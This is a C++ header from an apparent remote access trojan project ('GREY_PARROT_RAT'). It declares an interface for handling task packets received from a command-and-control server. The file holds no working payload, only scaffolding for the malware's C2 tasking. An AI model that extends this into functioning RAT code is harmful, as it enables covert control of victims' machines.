//
// Created by alsah on 09.05.23.
//

#ifndef GREY_PARROT_RAT_CORE_INBOX_CONTROL_PACKETS_HANDLER_INTERFACE
#define GREY_PARROT_RAT_CORE_INBOX_CONTROL_PACKETS_HANDLER_INTERFACE

#include "control.pb.h"

/** @interface IControlPacketHandler
 *
 * Interface for registering inbox tasks received from c2server.
 * This interface must be implemented by @class TaskManager
 **/
class IControlPacketHandler {
public:

    /**
     * @param packet - protobuf message that contains all necessary information
     */
    virtual void handleInbox(msgs::ControlPacket packet) = 0;
};

#endif //GREY_PARROT_RAT_CORE_INBOX_CONTROL_PACKETS_HANDLER_INTERFACE